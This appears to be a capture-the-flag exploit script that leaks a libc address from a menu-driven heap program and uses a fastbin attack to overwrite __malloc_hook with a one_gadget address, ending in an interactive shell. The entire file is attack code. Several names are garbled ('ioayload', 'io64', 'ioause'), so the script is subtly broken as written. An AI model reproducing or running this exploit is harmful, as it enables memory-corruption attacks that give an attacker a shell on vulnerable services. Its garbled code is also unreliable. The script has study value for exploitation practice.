from helper import *
    	
def gift(content):
	sla(b'choice :',b'6')
	sla(b'confidence ?:',content)
	ru(b'\n')

add(0x180,'a'*0x180)
add(0x78,'d'*0x78)
add(0x78,'e'*0x78)
free(0)
gift("")
add(0x78,"")
show(3)


data = io.recv()
leak_addr = u64(data[0x30:0x36].ljust(8,'\x00'))
log.success('leak libc addr: %s'%(hex(leak_addr)))


libc_base = leak_addr - (0x7f8c2cd83b0a-0x7f8c2c9bf000)
log.success("libc base address: %s"%hex(libc_base))
malloc_hook = libc_base + (0x7ffff7dd1b10-0x7ffff7a0d000)
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
fake_chunk = malloc_hook - 0x23
io.sendline('4')
sla('Index :',str(0))
ru('Success')
ioayload = io64(fake_chunk)
edit(0,0x80,ioayload)
ioause()
onegadget = onegadgets[3] + libc_base
ioayload = 'a'*0x13 + io64(onegadget)
gift(ioayload)
gift(ioayload)
sla('choice :','1')
sla('size :','128')
ru('\n')
io.interactive()
